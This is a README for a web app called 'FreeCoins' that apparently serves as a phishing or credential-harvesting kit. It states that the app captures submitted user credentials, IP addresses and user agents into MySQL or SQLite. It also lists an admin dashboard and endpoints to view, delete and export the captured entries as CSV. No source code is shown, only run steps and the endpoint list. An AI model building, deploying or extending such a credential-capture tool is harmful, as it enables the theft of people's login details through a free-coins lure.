# FreeCoins Web App & Database

A web application with an automated SQLite database to capture and store submitted user credentials.

## 🚀 How to Run

1. **Install Dependencies** (if not already installed):
   ```bash
   npm install
   ```

2. **Start the Server & Database**:
   ```bash
   npm start
   ```

3. **Open the Web Application**:
   - Main Website: [http://localhost:3000](http://localhost:3000)
   - Database Admin Dashboard: [http://localhost:3000/admin.html](http://localhost:3000/admin.html)

---

## 🗄️ Database Details

- **Primary Database Engine**: MySQL 8.0 (configured via `.env`)
- **Fallback Database Engine**: SQLite 3 (`database.sqlite`)
- **Database Name**: `freecoins_db`
- **Tables**:
  - `submissions`: Captures submitted user credentials, IP address, user agent, and timestamp.
  - `members`: Role-Based Access Control (RBAC) user accounts for Admin Panel access.

---

## 🛠️ API Endpoints

- `POST /api/login` - Submits and saves details to the SQLite database
- `GET /api/submissions` - Returns all saved submissions in JSON
- `DELETE /api/submissions/:id` - Deletes a specific entry
- `DELETE /api/submissions` - Clears all entries
- `GET /api/export/csv` - Downloads submissions as a CSV file